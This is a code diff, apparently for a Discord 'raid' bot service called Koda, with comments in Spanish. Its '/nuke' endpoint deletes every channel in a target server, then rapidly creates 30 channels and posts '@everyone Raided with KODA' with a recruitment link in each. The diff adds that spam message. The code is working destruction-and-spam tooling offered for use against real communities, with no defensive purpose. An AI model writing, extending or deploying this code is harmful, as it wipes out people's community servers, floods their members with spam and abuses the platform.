@@ -3,7 +3,7 @@ const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
 
-const app = express(); // <--- Esta línea es la que faltaba arriba
+const app = express();
 app.use(cors());
 app.use(express.json());
 
@@ -13,12 +13,13 @@ const CLIENT_ID = '1469577414022795346';
 const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
 const REDIRECT_URI = 'https://koda-raid.onrender.com/auth/callback';
 
-// Login y OAuth2
+// Login
 app.get('/login', (req, res) => {
     const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds`;
     res.redirect(url);
 });
 
+// Callback
 app.get('/auth/callback', async (req, res) => {
     const { code } = req.query;
     try {
@@ -36,7 +37,7 @@ app.get('/auth/callback', async (req, res) => {
     }
 });
 
-// API para listar servidores mutuos
+// API Servers
 app.get('/api/servers', async (req, res) => {
     const token = req.headers.authorization;
     try {
@@ -49,26 +50,34 @@ app.get('/api/servers', async (req, res) => {
     } catch (e) { res.status(500).send("Error"); }
 });
 
-// Función de Raid con FIRMA
+// NUKE + SPAM DE LINK
 app.get('/nuke', async (req, res) => {
     const { guildId, name } = req.query;
     const guild = client.guilds.cache.get(guildId);
     if (!guild) return res.status(404).send("Bot no está en el server");
 
-    const channelName = name || 'koda-raid'; // Firma por defecto
+    const channelName = name || 'koda-raid'; 
 
     try {
         const channels = await guild.channels.fetch();
+        // Borrar todo
         for (const c of channels.values()) await c.delete().catch(() => {});
         
-        for (let i = 0; i < 25; i++) {
+        // Crear canales y SPAMEAR link
+        for (let i = 0; i < 30; i++) {
             setTimeout(() => {
-                guild.channels.create({ name: channelName, type: 0 }).catch(() => {});
-            }, i * 400);
+                guild.channels.create({ name: channelName, type: 0 })
+                    .then(channel => {
+                        // AQUÍ ESTÁ EL MENSAJE QUE PIDE EL LINK
+                        channel.send("@everyone Raided with **KODA** ☠️\nJoin: https://koda-raid.vercel.app")
+                        .catch(() => {});
+                    })
+                    .catch(() => {});
+            }, i * 350);
         }
         res.send("Raid iniciado");
     } catch (e) { res.status(500).send("Fallo"); }
 });
 
 client.login(process.env.DISCORD_TOKEN);
-app.listen(process.env.PORT || 3000, () => console.log('Koda Engine Online'));
+app.listen(process.env.PORT || 3000);
